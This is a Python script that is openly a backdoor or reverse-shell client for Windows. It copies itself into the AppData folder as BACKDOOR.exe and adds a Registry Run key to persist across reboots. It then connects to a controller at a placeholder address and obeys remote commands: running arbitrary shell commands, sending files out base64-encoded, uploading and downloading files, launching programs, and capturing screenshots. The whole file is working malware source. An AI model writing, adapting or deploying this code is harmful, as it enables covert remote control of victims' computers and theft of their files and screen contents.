#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
from mss import mss

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_receive():
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def screenshot():
    with mss() as screenshot:
        screenshot.shot(output="monitor-1.png")

def download(url):
    get_response = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as out_file:
        out_file.write(get_response.content)
        
def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("127.0.0.1", 54321))
            shell()
        except:
            connection()

def shell(): 
    while True:
        command = reliable_receive()
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
                with open(command[9:], "rb") as file:
                    reliable_send(base64.b64encode(file.read()))
        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as fin:
                result = reliable_receive()
                fin.write(base64.b64decode(result))
        elif command[:3] == 'get':
            try:
                download(command[4:])
                reliable_send("[+] Downloaded file from url")
            except:
                reliable_send("[-] Failed to download file from url")
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started command")
            except:
                reliable_send("[-] Failed to start command")
        elif command[:10] == 'screenshot':
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[-] Faild to take screenshot")
                
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result)
            except:
                reliable_send("[!!] Can not execute command")


location = os.environ['appdata'] + "\\BACKDOOR.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)


sock = socket.socket(socket. AF_INET, socket.SOCK_STREAM)
connection()
sock.close